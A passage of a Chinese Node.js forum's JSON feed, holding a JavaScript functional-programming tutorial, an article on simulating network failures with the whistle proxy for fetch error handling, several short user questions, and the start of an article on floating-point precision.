y;\n}\n</code></pre><p>注意，<code>add</code> 函数不涉及<code>z</code>变量。它不从<code>z</code>读取，也不从<code>z</code>写入，它只读取<code>x</code>和<code>y</code>，然后返回它们相加的结果。这是一个纯函数。如果 add 函数确实访问了变量z，那么它就不再是纯函数了。</p>\n<p>请思考一下下面这个函数：</p>\n<pre class=\"prettyprint language-javascript\"><code>function justTen() {\n    return 10;\n}\n</code></pre><p>如果函数<code>justTen</code>是纯的，那么它只能返回一个常量, 为什么？</p>\n<p>因为我们没有给它任何参数。 而且，既然是纯函数的，除了自己的输入之外它不能访问任何东西，它唯一可以返回的就是常量。</p>\n<p>由于不带参数的纯函数不起作用，所以它们不是很有用。所以<code>justTen</code>被定义为一个常数会更好。</p>\n<blockquote>\n<p>大多数有用的纯函数必须至少带一个参数。</p>\n</blockquote>\n<p>考虑一下这个函数:</p>\n<pre class=\"prettyprint language-javascript\"><code>function addNoReturn(x, y) {\n    var z = x + y\n}\n</code></pre><p>注意这个函数是不返回任何值。它只是把变量<code>x</code>和<code>y</code>相加赋给变量<code>z</code>，但并没有返回。</p>\n<p>这个也是一个纯函数，因为它只处理输入。它确实对输入的变量进行操作，但是由于它不返回结果，所以它是无用的。</p>\n<blockquote>\n<p>所有有用的纯函数都必须返回一些我们期望的结果。</p>\n</blockquote>\n<p>让我们再次考虑第一个add函数:</p>\n<p><img src=\"https://image.fundebug.com/2018-12-27-02.png\" alt></p>\n<p>注意 <strong>add(1, 2)</strong> 的返回结果总是 3。这不是奇怪的事情，只是因为 <strong>add</strong> 函数是纯的。如果 <strong>add</strong> 函数使用了一些外部值，那么你永远无法预测它的行为。</p>\n<blockquote>\n<p>在给定相同输入的情况下，纯函数总是返回相同的结果。</p>\n</blockquote>\n<p>由于纯函数不能改变任何外部变量，所以下面的函数都不是纯函数:</p>\n<pre class=\"prettyprint language-javascript\"><code>writeFile(fileName);\nupdateDatabaseTable(sqlCmd);            \nsendAjaxRequest(ajaxRequest);\nopenSocket(ipAddress);\n</code></pre><p>所有这些功能都有副作用。当你调用它们时，它们会更改文件和数据库表、将数据发送到服务器或调用操作系统以获取套接字。它们不仅对输入操作同时也对输出进行操作，因此，你永远无法预测这些函数将返回什么。</p>\n<blockquote>\n<p>纯函数没有副作用。</p>\n</blockquote>\n<p>在Javascript、Java 和 c# 等命令式编程语言中，副作用无处不在。这使得调试非常困难，因为变量可以在程序的任何地方更改。所以，当你有一个错误，因为一个变量在错误的时间被更改为错误的值，这不是很好。</p>\n<p>此时，你可能会想，“我怎么可能只使用纯函数呢?”</p>\n<p>函数式编程不能消除副作用，只能限制副作用。由于程序必须与真实环境相连接，所以每个程序的某些部分肯定是不纯的。函数式编程的目标是尽量写更多的纯函数，并将其与程序的其他部分隔离开来。</p>\n<h3>不可变性 (Immutability)</h3>\n<p>你还记得你第一次看到下面的代码是什么时候吗?</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\nx = x + 1;\n</code></pre><p>教你初中数学的老师看到以上代码，可能会问你，你忘记我给你教的数学了吗？ 因为在数学中，x 永远不能等于x + 1。</p>\n<p>但在命令式编程中，它的意思是，取<code>x</code>的当前值加1，然后把结果放回<code>x</code>中。</p>\n<p>在函数式编程中，x = x + 1是非法的。所以这里你可以用数学的逻辑还记得在数式编程中这样写是不对的！</p>\n<blockquote>\n<p>函数式编程中没有变量。</p>\n</blockquote>\n<p>由于历史原因，存储值的变量仍然被称为变量，但它们是常量，也就是说，一旦<code>x</code>取值，这个常量就是<code>x</code>返回的值。别担心，<code>x</code> 通常是一个局部变量，所以它的生命周期通常很短。但只要它还没被销毁，它的值就永远不会改变。</p>\n<p>下面是<code>Elm</code>中的常量变量示例，<code>Elm</code>是一种用于Web开发的纯函数式编程语言:</p>\n<pre class=\"prettyprint language-javascript\"><code>addOneToSum y z =\n    let\n        x = 1\n    in\n        x + y + z\n</code></pre><p>如果你不熟悉ml风格的语法，让我解释一下。<code>addOneToSum</code> 是一个函数，有两个参数分别为<code>y</code>和<code>z</code>。</p>\n<p>在<code>let</code>块中，<code>x</code>被绑定到<code>1</code>的值上，也就是说，它在函数的生命周期内都等于1。当函数退出时，它的生命周期结束，或者更准确地说，当<code>let</code>块被求值时，它的生命周期就结束了。</p>\n<p>在<code>in</code>块中，计算可以包含在<code>let</code>块中定义的值，即 x，返回计算结果 x + y + z，或者更准确地说，返回 1 + y + z，因为 x = 1。</p>\n<p>你可能又会想 :“我怎么能在没有变量的情况下做任何事情呢?”</p>\n<p>我们想一下什么时候需要修改变量。通常会想到两种情况:多值更改(例如修改或记录对象中的单个值)和单值更改(例如循环计数器)。</p>\n<p>函数式编程使用参数保存状态，最好的例子就是递归。是的，是没有循环。“什么没有变量，现在又没有循环? ”我讨厌你! ! !”</p>\n<p>哈哈，这并不是说我们不能做循环，只是没有特定的循环结构，比如for, while, do, repeat等等。</p>\n<blockquote>\n<p>函数式编程使用递归进行循环。</p>\n</blockquote>\n<p>这里有两种方法可以在Javascript中执行循环:</p>\n<p><img src=\"https://image.fundebug.com/2018-12-27-03.png\" alt></p>\n<p>注意，递归是一种函数式方法，它通过使用一个结束条件 <strong>start (start + 1)</strong> 和调用自己 <strong>accumulator (acc + start)</strong> 来实现与 for 循环相同的功能。它不会修改旧的值。相反，它使用从旧值计算的新值。</p>\n<p>不幸的是，这在 Javascript中 很难想懂，需要你花点时间研究它，原因有二。第一，Javascript的语法相对其它高级语言比较乱，其次，你可能还不习惯递归思维。</p>\n<p>在Elm，它更容易阅读，如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>sumRange start end acc =\n    if start &gt; end then\n        acc\n    else\n        sumRange (start + 1) end (acc + start) \n    \n</code></pre><p>它是这样运行的:</p>\n<p><img src=\"https://image.fundebug.com/2018-12-27-04.png\" alt></p>\n<p>你可能认为 <strong>for</strong> 循环更容易理解。虽然这是有争议的，而且更可能是一个熟悉的问题，但非递归循环需要可变性，这是不好的。</p>\n<p>在这里，我还没有完全解释不变性的好处，但是请查看全局可变状态部分，即为什么程序员需要限制来了解更多。</p>\n<p>我还没有完全解释不可变性(Immutability)在这里的好处，但请查看 <a href=\"https://medium.com/%5B@cscalfani%5D(/user/cscalfani)/why-programmers-need-limits-3d96e1a0a6db\">为什么程序员需要限制的全局可变状态部分</a> 以了解更多信息。</p>\n<p>不可变性的好处是，你读取访问程序中的某个值，但只有读权限的，这意味着不用害怕其他人更改该值使自己读取到的值是错误。</p>\n<p>不可变性的还有一个好处是，如果你的程序是多线程的，那么就没有其他线程可以更改你线程中的值，因为该值是不可变，所以另一个线程想要更改它，它只能从旧线程创建一个新值。</p>\n<blockquote>\n<p>不变性可以创建更简单、更安全的代码。</p>\n</blockquote>\n<h3>重构</h3>\n<p>让我们考虑一下重构，下面是一些Javascript代码:</p>\n<p><img src=\"https://image.fundebug.com/2018-12-27-05.png\" alt></p>\n<p>我们以前可能都写过这样的代码，随着时间的推移，开始意识到这两个函数实际上是相同的，函数名称，打印结果不太一样而已。</p>\n<p>我们不应该复制 validateSsn 来创建 validatePhone，而是应该创建一个函数(共同的部分)，通过参数形式实现我们想要的结果。</p>\n<p>重构后的代码如下：</p>\n<p><img src=\"https://image.fundebug.com/2018-12-27-06.png\" alt></p>\n<p>旧代码参数中 <strong>ssn</strong> 和 <strong>phone</strong> 现在用 <strong>value</strong> 表示，正则表达式 <strong>/^\\d{3}-\\d{2}-\\d{4}$/ and /^(\\d{3})\\d{3}-\\d{4}$/</strong> 由变量 <strong>regex</strong>. 表示。最后，消息**“SSN”**和 <strong>“电话号码”</strong> 由变量 <strong>type</strong> 表示。</p>\n<p>这个有类似的函数都可以使用这个函数来实现，这样可以保持代码的整洁和可维护性。</p>\n<h3>高阶函数</h3>\n<p>许多语言不支持将函数作为参数传递,有些会支持但并不容易。</p>\n<blockquote>\n<p>在函数式编程中，函数是一级公民。换句话说，函数通常是另一个函数的值。</p>\n</blockquote>\n<p>由于函数只是值，我们可以将它们作为参数传递。即使Javascript不是纯函数语言，也可以使用它进行一些功能性的操作。 所以这里将上面的两个函数重构为单个函数，方法是将验证合法性的函数作为函数 <strong>parseFunc</strong> 的参数：</p>\n<pre class=\"prettyprint language-javascript\"><code>function validateValueWithFunc(value, parseFunc, type) {\n  if (parseFunc(value))\n    console.log(&#x27;Invalid &#x27; + type);\n  else\n    console.log(&#x27;Valid &#x27; + type);\n}\n</code></pre><p>像函数 <strong>parseFunc</strong> 接收一个或多个函数作为输入的函数，称为 <strong>高阶函数</strong>。</p>\n<blockquote>\n<p>高阶函数要么接受函数作为参数，要么返回函数，要么两者兼而有之。</p>\n</blockquote>\n<p>现在可以调用高阶函数（这在Javascript中有效，因为Regex.exec在找到匹配时返回一个truthy值）：</p>\n<pre class=\"prettyprint language-javascript\"><code>validateValueWithFunc(&#x27;123-45-6789&#x27;, &#x2F;^\\d{3}-\\d{2}-\\d{4}$&#x2F;.exec, &#x27;SSN&#x27;);\nvalidateValueWithFunc(&#x27;(123)456-7890&#x27;, &#x2F;^\\(\\d{3}\\)\\d{3}-\\d{4}$&#x2F;.exec, &#x27;Phone&#x27;);\nvalidateValueWithFunc(&#x27;123 Main St.&#x27;, parseAddress, &#x27;Address&#x27;);\nvalidateValueWithFunc(&#x27;Joe Mama&#x27;, parseName, &#x27;Name&#x27;);\n</code></pre><p>这比有四个几乎相同的函数要好得多。</p>\n<p>但是请注意正则表达式，这里有点冗长了。简化一下：</p>\n<pre class=\"prettyprint language-javascript\"><code>var parseSsn = &#x2F;^\\d{3}-\\d{2}-\\d{4}$&#x2F;.exec;\nvar parsePhone = &#x2F;^\\(\\d{3}\\)\\d{3}-\\d{4}$&#x2F;.exec;\nvalidateValueWithFunc(&#x27;123-45-6789&#x27;, parseSsn, &#x27;SSN&#x27;);\nvalidateValueWithFunc(&#x27;(123)456-7890&#x27;, parsePhone, &#x27;Phone&#x27;);\nvalidateValueWithFunc(&#x27;123 Main St.&#x27;, parseAddress, &#x27;Address&#x27;);\nvalidateValueWithFunc(&#x27;Joe Mama&#x27;, parseName, &#x27;Name&#x27;);\n</code></pre><p>现在看起来好多了。现在，当要验证一个电话号码时，不需要复制和粘贴正则表达式了。</p>\n<p>但是假设我们有更多的正则表达式需要解析，而不仅仅是 <strong>parseSsn</strong> 和 <strong>parsePhone</strong>。每次创建正则表达式解析器时，我们都必须记住在末尾添加 <strong>.exec</strong>，这很容易被忘记。</p>\n<p>可以通过创建一个返回<strong>exec</strong> 的高阶函数来防止这种情况:</p>\n<pre class=\"prettyprint language-javascript\"><code>function makeRegexParser(regex) {\n    return regex.exec;\n}\nvar parseSsn = makeRegexParser(&#x2F;^\\d{3}-\\d{2}-\\d{4}$&#x2F;);\nvar parsePhone = makeRegexParser(&#x2F;^\\(\\d{3}\\)\\d{3}-\\d{4}$&#x2F;);\nvalidateValueWithFunc(&#x27;123-45-6789&#x27;, parseSsn, &#x27;SSN&#x27;);\nvalidateValueWithFunc(&#x27;(123)456-7890&#x27;, parsePhone, &#x27;Phone&#x27;);\nvalidateValueWithFunc(&#x27;123 Main St.&#x27;, parseAddress, &#x27;Address&#x27;);\nvalidateValueWithFunc(&#x27;Joe Mama&#x27;, parseName, &#x27;Name&#x27;);\n</code></pre><p>这里，makeRegexParser采用正则表达式并返回exec函数，该函数接受一个字符串。validateValueWithFunc 将字符串 value 传递给 parse 函数，即exec。</p>\n<p><strong>parseSsn</strong> 和 <strong>parsePhone</strong> 实际上与以前一样，是正则表达式的 <strong>exec</strong> 函数。</p>\n<p>当然，这是一个微小的改进，但是这里给出了一个返回函数的高阶函数示例。但是，如果<strong>makeRegexParser</strong> 要复杂得多，这种更改的好处是很大的。</p>\n<p>下面是另一个返回函数的高阶函数示例:</p>\n<pre class=\"prettyprint language-javascript\"><code>function makeAdder(constantValue) {\n    return function adder(value) {\n        return constantValue + value;\n    };\n}\n</code></pre><p>函数 <strong>makeAdder</strong>，接受参数 <strong>constantValue</strong> 并返回函数 <strong>adder</strong>，这个函数返回 <strong>constantValue</strong> 与它传入参数相加结果。</p>\n<p>下面是它的用法:</p>\n<pre class=\"prettyprint language-javascript\"><code>var add10 = makeAdder(10);\nconsole.log(add10(20)); &#x2F;&#x2F; 打印 30\nconsole.log(add10(30)); &#x2F;&#x2F; 打印 40\nconsole.log(add10(40)); &#x2F;&#x2F; 打印 50\n</code></pre><p>我们通过将常量10传递给 <strong>makeAdder</strong> 来创建一个函数 <strong>add10</strong>, <strong>makeAdder</strong> 返回一个函数，该函数将向返回的结果都加 10。</p>\n<p>注意，即使在 <strong>makeAddr</strong> 返回之后，函数 <strong>adder</strong> 也可以访问变量 <strong>constantValue</strong>。 这里能访问到 <strong>constantValue</strong> 是因为存在闭包。</p>\n<p>闭包机制非常重要，因为如果没有它 ，返回函数的函数就不会有很大作用。所以必须了解它们是如何工作。</p>\n<h3>闭包</h3>\n<p><img src=\"https://image.fundebug.com/2018-12-27-07.png\" alt></p>\n<p>下面是一个使用闭包的函数的示例:</p>\n<pre class=\"prettyprint language-javascript\"><code>function grandParent(g1, g2) {\n    var g3 = 3;\n    return function parent(p1, p2) {\n        var p3 = 33;\n        return function child(c1, c2) {\n            var c3 = 333;\n            return g1 + g2 + g3 + p1 + p2 + p3 + c1 + c2 + c3;\n        };\n    };\n}\n</code></pre><p>在这个例子中，<strong>child</strong> 函数可以访问它自身的变量，函数 <strong>parent</strong> 函数可以访问它的自身变量和函数 <strong>grandParent</strong> 的变量。而函数 <strong>grandParent</strong> 只能访问自身的变量。</p>\n<p>下面是它的一个使用例子:</p>\n<pre class=\"prettyprint language-javascript\"><code>var parentFunc = grandParent(1, 2); &#x2F;&#x2F; returns parent()\nvar childFunc = parentFunc(11, 22); &#x2F;&#x2F; returns child()\nconsole.log(childFunc(111, 222)); &#x2F;&#x2F; prints 738\n&#x2F;&#x2F; 1 + 2 + 3 + 11 + 22 + 33 + 111 + 222 + 333 == 738\n</code></pre><p>在这里，<strong>parentFunc</strong> 保留了 <strong>parent</strong> 的作用域，因为 <strong>grandParent</strong> 返回 <strong>parent</strong>。</p>\n<p>类似地，<strong>childFunc</strong> 保留了 <strong>child</strong> 的作用域，因为 <strong>parentFunc</strong> 保留了 <strong>parent</strong> 的作用域，而 <strong>parent</strong> 的作用域 保留了<strong>child</strong> 的作用域。</p>\n<p>当一个函数被创建时，它在创建时作用域中的所有变量在函数的生命周期内都是可访问的。一个函数只要还有对它的引用就存在。例如，只要childFunc 还引用 child 的作用域，child 的作用域就存在。</p>\n<p>闭包具体还看看之前整理的一篇文章：<a href=\"https://segmentfault.com/a/1190000017136436\">我从来不理解JavaScript闭包，直到有人这样向我解释它…</a></p>\n<p><strong>原文:</strong>\n1、[<a href=\"https://medium.com/\">https://medium.com/</a><a href=\"/user/cscalfani\">@cscalfani</a>…](<a href=\"https://medium.com/\">https://medium.com/</a><a href=\"/user/cscalfani\">@cscalfani</a>/so-you-want-to-be-a-functional-programmer-part-1-1f15e387e536)\n2、[<a href=\"https://medium.com/\">https://medium.com/</a><a href=\"/user/cscalfani\">@cscalfani</a>…](<a href=\"https://medium.com/\">https://medium.com/</a><a href=\"/user/cscalfani\">@cscalfani</a>/so-you-want-to-be-a-functional-programmer-part-2-7005682cec4a)</p>\n<p><strong>编辑中可能存在的bug没法实时知道，事后为了解决这些bug,花了大量的时间进行log 调试，这边顺便给大家推荐一个好用的BUG监控工具Fundebug。</strong></p>\n<p><strong>你的点赞是我持续分享好东西的动力，欢迎点赞！</strong></p>\n<p><strong>一个笨笨的码农，我的世界只能终身学习！</strong></p>\n<p><strong>更多内容请关注公众号《大迁世界》！</strong></p>\n</div>","title":"学会JavaScript函数式编程(第1部分)","last_reply_at":"2018-12-27T02:00:07.480Z","good":false,"top":false,"reply_count":0,"visit_count":583,"create_at":"2018-12-27T02:00:07.479Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5c22e92f3898674067a7870f","author_id":"5c1b04c03898674067a76417","tab":"ask","content":"<div class=\"markdown-text\"><p>例如：\n<img src=\"//static.cnodejs.org/Fk9rPaQHRZcJqEB8EyXwaCKLRTr4\" alt=\"image.png\"></p>\n<p>例如：\n<img src=\"//static.cnodejs.org/FqznHNN97O0Xri03PZdarI1G_rHE\" alt=\"image.png\"></p>\n</div>","title":"请问下，对于一个大型博客社区网站，搜索文章功能使用什么技术点呢？","last_reply_at":"2018-12-27T01:52:17.637Z","good":false,"top":false,"reply_count":15,"visit_count":841,"create_at":"2018-12-26T02:36:31.180Z","author":{"loginname":"didiaohu","avatar_url":"https://avatars0.githubusercontent.com/u/19411940?v=4&s=120"}},{"id":"5c20649b76c4964062a1cfa4","author_id":"5c1b04c03898674067a76417","tab":"ask","content":"<div class=\"markdown-text\"><p>一个接口，好几种情况，但根据 restful 规范，这几种情况都属于 401 ，但是我又想区分这几种情况，做不同处理，该怎么办呢？？？？</p>\n</div>","title":"请教一个 restful 命名问题？","last_reply_at":"2018-12-27T00:21:30.351Z","good":false,"top":false,"reply_count":8,"visit_count":839,"create_at":"2018-12-24T04:46:19.137Z","author":{"loginname":"didiaohu","avatar_url":"https://avatars0.githubusercontent.com/u/19411940?v=4&s=120"}},{"id":"5c234eca3898674067a78a7b","author_id":"5c176d22f3d48d2397c12134","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文由云+社区发表</p>\n</blockquote>\n<p>绝大多数程序只考虑了接口正常工作的场景，而用户在使用我们的产品时遇到的各类异常，全都丢在看似 ok 的 try catch 中。如果没有做好异常的兼容和兜底处理，会极大的影响用户体验，严重的还会带来安全和资损风险。</p>\n<p>接口异常，通常可以分为以下三类：</p>\n<ul>\n<li>**CGI 逻辑出错。**如调用方入参缺失类业务逻辑报错；</li>\n<li>**服务不稳定。**如服务器不稳定导致 nginx 各类 500、502，cgi 路径调整导致的 404</li>\n<li>**用户网络环境差。**如，网络不稳定、网速慢、运营商劫持等</li>\n</ul>\n<p>那么，我们在写代码时，<strong>如何快速的模拟这些接口异常，做好程序的兼容处理呢？</strong></p>\n<p>今天向大家介绍网络调试神器 whistle 的网络异常调试方法，如果你还没用过 whistle，请参考《8102 年的程序员不需要 Hosts 和 Fiddler》。</p>\n<p>假设我们有以下前端页面 index.html，放置在自己的本地路径：</p>\n<pre class=\"prettyprint language-javascript\"><code>&lt;p id=&quot;success&quot; style=&quot;color:green;&quot;&gt;&lt;&#x2F;p&gt;\n&lt;p id=&quot;fail&quot; style=&quot;color:red;&quot;&gt;&lt;&#x2F;p&gt;\n&lt;script&gt;\n  fetch(&#96;&#x2F;mock?r=${Math.random()}&#96;)\n    .then(response =&gt; {\n      return response.json()\n    })\n    .then(v =&gt; {\n      document.getElementById(&#x27;success&#x27;).innerHTML = v.data;\n    }).catch(err =&gt; {\n      document.getElementById(&#x27;fail&#x27;).innerHTML = err.message;\n    })\n&lt;&#x2F;script&gt;\n</code></pre><p>接下来，打开 whistle Rules 配置面板 <a href=\"http://127.0.0.1:8899/#rules\">http://127.0.0.1:8899/#rules</a> ，配置模拟的 demo page 和 mock CGI：</p>\n<pre class=\"prettyprint language-javascript\"><code>*&#x2F;mock file:&#x2F;&#x2F;({&quot;code&quot;:0,&quot;data&quot;:&quot;success&quot;}) # 配置 mock cgi 为模拟的 json 数据\nexample.com file:&#x2F;&#x2F;&#x2F;Users&#x2F;kaiye&#x2F;Projects&#x2F;Markdown&#x2F;20181213&#x2F; # 配置任意域名到本地 demo 目录，这里注意替换成自己的路径\n</code></pre><p>打开 <a href=\"http://example.com\">http://example.com</a> ，正常逻辑下页面展示出了绿色的 <strong>success</strong> ，现在我们开始加入一些网络异常。</p>\n<h2>1、业务逻辑异常处理</h2>\n<p>例如 CGI 没有返回 <code>data</code> 字段，而是返回了一个错误码 <code>code</code> 和对应的 <code>message</code>，针对这种业务逻辑异常我们只需在第二个 <code>then</code> 中做好 code 值的判断即可（注意，这里的 code、message、data 只是示例，实际业务 CGI 中的 JSON 结构体的字段名很可能不同）：</p>\n<pre class=\"prettyprint language-javascript\"><code>fetch(&#96;&#x2F;mock?r=${Math.random()}&#96;)\n  .then(response =&gt; response.json())\n  .then((v) =&gt; {\n    &#x2F;&#x2F; 业务逻辑异常处理\n    if (v.code !== 0) {\n      return Promise.reject(new Error(&#96;ERROR_LOGIC_CODE:${v.code}&#96;));\n    }\n    document.getElementById(&#x27;success&#x27;).innerHTML = v.data;\n  })\n  .catch((err) =&gt; {\n    document.getElementById(&#x27;fail&#x27;).innerHTML = err.message;\n  });\n\n</code></pre><p>相应的 whistle 配置如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>*&#x2F;mock file:&#x2F;&#x2F;({&quot;code&quot;:12345,&quot;message&quot;:&quot;some_logic_error&quot;}) # 模拟业务逻辑异常\n</code></pre><h2>2、服务器异常处理</h2>\n<p>如果服务器直接抛出了 502 错误码，我们希望代码能给用户提示的同时，再做一个异常上报。</p>\n<pre class=\"prettyprint language-javascript\"><code>fetch(&#96;&#x2F;mock?r=${Math.random()}&#96;)\n  .then((response) =&gt; {\n    &#x2F;&#x2F; 服务器异常处理\n    if (response.ok) {\n      return response.json();\n    }\n    return Promise.reject(new Error(&#96;ERROR_STATUS_CODE:${response.status}&#96;));\n  })\n  .then((v) =&gt; {\n    &#x2F;&#x2F; 业务逻辑异常处理\n    if (v.code !== 0) {\n      return Promise.reject(new Error(&#96;ERROR_LOGIC_CODE:${v.code}&#96;));\n    }\n    document.getElementById(&#x27;success&#x27;).innerHTML = v.data;\n  })\n  .catch((err) =&gt; {\n    const [type, value] = err.message.split(&#x27;:&#x27;);\n    &#x2F;&#x2F; 异常类型上报\n    console.log(type, value);\n    document.getElementById(&#x27;fail&#x27;).innerHTML = err.message;\n  });\n\n</code></pre><p>通过 whistle 的模拟配置如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>*&#x2F;mock statusCode:&#x2F;&#x2F;502 # 模拟 HTTP 状态码异常\n</code></pre><h2>3、接口被劫持注入</h2>\n<p>如果 CGI 被运营商劫持注入，可能导致接口返回一个不合法的 JSON 结构，最前面的 <code>response.json()</code> 会抛异常，我们可以提前 catch 住：</p>\n<pre class=\"prettyprint language-javascript\"><code>fetch(&#96;&#x2F;mock?r=${Math.random()}&#96;).then((response) =&gt; {\n  &#x2F;&#x2F; 服务器异常处理\n  if (response.ok) {\n    return (\n      response\n        .json()\n        &#x2F;&#x2F; 接口数据解码异常处理\n        .catch(err =&gt; Promise.reject(new Error(&#x27;ERROR_DECODE_JSON&#x27;)))\n    );\n  }\n  return Promise.reject(new Error(&#96;ERROR_STATUS_CODE:${response.status}&#96;));\n});\n\n</code></pre><p>whistle 模拟配置如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>*&#x2F;mock file:&#x2F;&#x2F;(&lt;div&gt;hijacking&lt;&#x2F;div&gt;{&quot;code&quot;:0,&quot;data&quot;:&quot;success&quot;}) # 模拟接口被劫持注入 1\n</code></pre><p>借助 <a href=\"http://wproxy.org/whistle/rules/htmlAppend.html\">htmlAppend</a> 和 <a href=\"http://wproxy.org/whistle/webui/values.html\">values</a> 配置，可以模拟更复杂的注入示例：</p>\n<pre class=\"prettyprint language-javascript\"><code>*&#x2F;mock file:&#x2F;&#x2F;({&quot;code&quot;:0,&quot;data&quot;:&quot;success&quot;}) htmlAppend:&#x2F;&#x2F;{hijacking.html} # 模拟接口被劫持注入 2\n&#96;&#96;&#96;hijacking.html\n&lt;script&gt;\nalert(&#x27;hijacking&#x27;)\n&lt;&#x2F;script&gt;\n&#96;&#96;&#96;\n</code></pre><h2>4、用户网络不稳定</h2>\n<p><strong>如果我们要模拟请求发出 10 秒后断网或网络不通的情况</strong>，可以通过 whistle 这样配置：</p>\n<pre class=\"prettyprint language-javascript\"><code>*&#x2F;mock reqDelay:&#x2F;&#x2F;10000 enable:&#x2F;&#x2F;abort # 模拟 10 秒超时后网络不通\n</code></pre><p>让用户苦苦等待 10 秒，再报错的体验太糟糕。我们可以封装一个能配置超时时间的请求发送函数，同时把上面提到的错误异常都一起配置进来。</p>\n<pre class=\"prettyprint language-javascript\"><code>&lt;p id=&quot;success&quot; style=&quot;color:green;&quot;&gt;&lt;&#x2F;p&gt;\n&lt;p id=&quot;fail&quot; style=&quot;color:red;&quot;&gt;&lt;&#x2F;p&gt;\n&lt;script&gt;\n  function myFetch(url, configOptions) {\n    const options = Object.assign(\n      {\n        timeout: 3000\n      },\n      configOptions\n    )\n    const { timeout } = options\n    return new Promise((resolve, reject) =&gt; {\n      &#x2F;&#x2F; 超时异常处理\n      const timer = setTimeout(() =&gt; {\n        reject(new Error(&#96;ERROR_TIMEOUT:${timeout}&#96;))\n      }, timeout)\n      fetch(url, options)\n        .then(data =&gt; {\n          clearTimeout(timer)\n          resolve(data)\n        })\n        .catch(err =&gt; {\n          clearTimeout(timer)\n          reject(err)\n        })\n    })\n      .then(response =&gt; {\n        &#x2F;&#x2F; 服务器异常处理\n        if (response.ok) {\n          return (\n            response\n              .json()\n              &#x2F;&#x2F; 接口数据解码异常处理\n              .catch(err =&gt; Promise.reject(new Error(&#x27;ERROR_DECODE_JSON&#x27;)))\n          )\n        } else {\n          return Promise.reject(\n            new Error(&#96;ERROR_STATUS_CODE:${response.status}&#96;)\n          )\n        }\n      })\n      .then(v =&gt; {\n        &#x2F;&#x2F; 业务逻辑异常处理\n        if (v.code !== 0) {\n          return Promise.reject(new Error(&#96;ERROR_LOGIC_CODE:${v.code}&#96;))\n        } else {\n          return v.data\n        }\n      })\n      .catch(err =&gt; {\n        const [type, value] = err.message.split(&#x27;:&#x27;)\n        &#x2F;&#x2F; 异常类型上报\n        console.log(type, value)\n        return Promise.reject(err)\n      })\n  }\n  myFetch(&#96;&#x2F;mock?r=${Math.random()}&#96;)\n    .then(data =&gt; {\n      document.getElementById(&#x27;success&#x27;).innerHTML = data\n    })\n    .catch(err =&gt; {\n      document.getElementById(&#x27;fail&#x27;).innerHTML = err.message\n    })\n&lt;&#x2F;script&gt;\n\n</code></pre><p>这样，自定义的 <code>myFetch</code> 只需关注业务具体逻辑，针对不同的 catch error 做对应的处理。</p>\n<p>除以上提到的协议命令字外，**whistle 还支持 resSpeed 用于模拟低网速传输（单位：kb/s），tpl 协议则可以根据请求传入参数来动态模拟不同的数据。**在 Frames 面板，还可以对 WebSocket/Socket 请求进行暂停、延迟等网络异常的模拟。</p>\n<h2>小程序 fetch API 实现</h2>\n<p>最后，留一道思考题。</p>\n<p>近来微信小程序开发非常火，小程序原生提供的 wx.request API 能用于发送 HTTPS 请求，请在它的基础之上进行封装，支持 promise 调用和 <code>timeout</code> 超时时间定义（小程序默认的请求超时定义在 app.json 中，不够灵活），并针对以上提到的 HTTP 状态码异常、接口劫持注入、慢网络、无网络状态等各种网络异常进行兼容处理。</p>\n<p>欢迎留言分享你的代码实现</p>\n<p><strong>此文已由作者授权腾讯云+社区发布</strong></p>\n<hr>\n</div>","title":"99%的程序都没有考虑的网络异常","last_reply_at":"2018-12-26T09:50:02.620Z","good":false,"top":false,"reply_count":0,"visit_count":700,"create_at":"2018-12-26T09:50:02.620Z","author":{"loginname":"qcommunitycloud","avatar_url":"https://avatars2.githubusercontent.com/u/45935731?v=4&s=120"}},{"id":"5c2327e876c4964062a1e0a3","author_id":"4efc278625fa69ac6900044d","tab":"ask","content":"<div class=\"markdown-text\"><p>现在在做物联网相关的业务，一个功能需求是能直接通过ssh连接在4G网络下的树莓派，我印象之前在这里看到过一贴子，讲的就是内网的win服务器通过node代理连接到公网服务器，然后其它人可以通过这台公网服务器上的node代理去连接内网的win服务器，谁方便帮我找一下吗？谢谢谢谢，我自己搜索过，但找不到我之前看过的贴子</p>\n</div>","title":"谁方便帮我找下或告知这里的一篇技术分享贴子内容是通过node代理进行远程连接服务器","last_reply_at":"2018-12-26T07:04:08.733Z","good":false,"top":false,"reply_count":0,"visit_count":560,"create_at":"2018-12-26T07:04:08.733Z","author":{"loginname":"wldlzt","avatar_url":"//gravatar.com/avatar/b53aa550eb26aaab7ad98cfac654acd1?s=48"}},{"id":"5c22eba676c4964062a1dde3","author_id":"56cb313d66c88b5e490260a9","tab":"ask","content":"<div class=\"markdown-text\"><p>因为手机不方便发帖，自响应故意设置的吗？</p>\n</div>","title":"手机web没有看到发帖按钮，是故意设置的吗？","last_reply_at":"2018-12-26T05:31:48.858Z","good":false,"top":false,"reply_count":2,"visit_count":587,"create_at":"2018-12-26T02:47:02.861Z","author":{"loginname":"awong1900","avatar_url":"https://avatars1.githubusercontent.com/u/4022612?v=4&s=120"}},{"id":"5c22fd4c76c4964062a1decc","author_id":"5c176d22f3d48d2397c12134","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文由云+社区发表</p>\n</blockquote>\n<p>相信大家在平常的 JavaScript 开发中，都有遇到过浮点数运算精度误差的问题，比如 <code>console.log(0.1+0.2===0.3)// false</code>。在 JavaScript 中，所有的数字包括整数和小数都是用 <code>Number</code> 类型来表示的。本文通过介绍 <code>Number</code> 的二进制存储标准来理解浮点数运算精度问题，和理解 <code>Number</code> 对象的 <code>MAX_VALUE</code> 等属性值是如何取值的，最后介绍了一些常用的浮点数精度运算解决方案。</p>\n<h2>Number 的存储标准</h2>\n<p>JavaScript Number 采用的是 IEEE 754 定义的 64 位双精度浮点型来表示。具体的字节分配可以先看一下引自维基百科的图：</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/1034093/xv82afj30x.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>从上图中可以看到，从高到低，64位被分成3段，分别是:</p>\n<ul>\n<li>sign: 符号位，占 1 位；</li>\n<li>exponent: 指数位，占 11 位；</li>\n<li>fraction: 有效数字位，占 52 位。</li>\n</ul>\n<p>指数位有 11 